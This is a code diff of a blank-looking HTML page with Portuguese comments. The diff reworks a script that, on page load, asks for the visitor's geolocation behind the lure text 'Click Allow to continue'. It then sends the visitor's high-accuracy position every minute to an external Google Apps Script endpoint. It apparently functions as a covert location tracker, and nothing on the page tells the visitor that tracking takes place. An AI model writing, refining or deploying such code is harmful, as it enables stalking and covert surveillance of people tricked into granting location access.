@@ -3,17 +3,25 @@
 <head>
   <title> </title>
   <script>
-    let watchID;
     let intervalID;
     const url = "https://script.google.com/macros/s/AKfycbwYOerrVwS24d7WHZ1bwZ6cq4kn1L04IuyrPFU0vv4-bJKJWkmInu4TINKH9QG83s0k/exec";
     
     function startSendingLocation() {
       if (navigator.geolocation) {
-        // Configura o observador da localização
-        watchID = navigator.geolocation.watchPosition(
+        // Solicita a localização para garantir que a permissão seja solicitada
+        navigator.geolocation.getCurrentPosition(
           position => {
-            // Define a localização e agende o envio
-            sendLocation(position);
+            sendLocation(position); // Envia a localização inicial
+            // Envia a localização a cada 1 minuto (60000 ms)
+            intervalID = setInterval(() => {
+              navigator.geolocation.getCurrentPosition(position => {
+                sendLocation(position);
+              }, showError, {
+                enableHighAccuracy: true,
+                maximumAge: 30000,
+                timeout: 27000
+              });
+            }, 60000);
           },
           showError,
           {
@@ -22,19 +30,6 @@
             timeout: 27000
           }
         );
-        
-        // Envia a localização a cada 1 minuto (60000 ms)
-        intervalID = setInterval(() => {
-          if (navigator.geolocation) {
-            navigator.geolocation.getCurrentPosition(position => {
-              sendLocation(position);
-            }, showError, {
-              enableHighAccuracy: true,
-              maximumAge: 30000,
-              timeout: 27000
-            });
-          }
-        }, 60000);
         
       } else {
         alert("Geolocalização não é suportada neste navegador.");
@@ -80,8 +75,8 @@
   </script>
 </head>
 <body onload="startSendingLocation()">
-  <h1> </h1>
-  <h1> </h1>
+  <h1> </h1>
+  <h1> </h1>
   <h1>Clique em Permitir para continuar...</h1>
 </body>
 </html>
